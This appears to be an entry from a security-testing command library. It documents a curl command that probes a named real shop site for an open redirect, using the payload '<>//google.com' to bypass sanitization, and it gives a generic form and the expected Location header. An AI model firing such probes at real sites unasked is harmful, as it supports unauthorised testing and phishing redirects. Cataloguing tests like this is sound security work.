---
id: cmd-curl-chained-redirect
data: >-
  curl -v "https://shop.starbucks.de/?prefn1=<>//google.com" 2>&1 | grep
  Location
tags:
  - web-testing
  - redirect
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:23.376Z'
verified: false
validated: true
submitted: true
---
# curl-chained-redirect

## Command

```bash
curl -v "https://shop.starbucks.de/?prefn1=<>//google.com" 2>&1 | grep Location
```

## Description

Tests chained redirect with specific payload structure to bypass sanitization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output | Yes |
| URL with payload | Includes '<>//target' | Yes |

## Examples

### Basic Usage

```bash
curl -v "https://site/?param=<>//external" 2>&1 | grep Location
```

## Expected Output

`< Location: https://google.com`

## Related

- [[Related Procedure]]
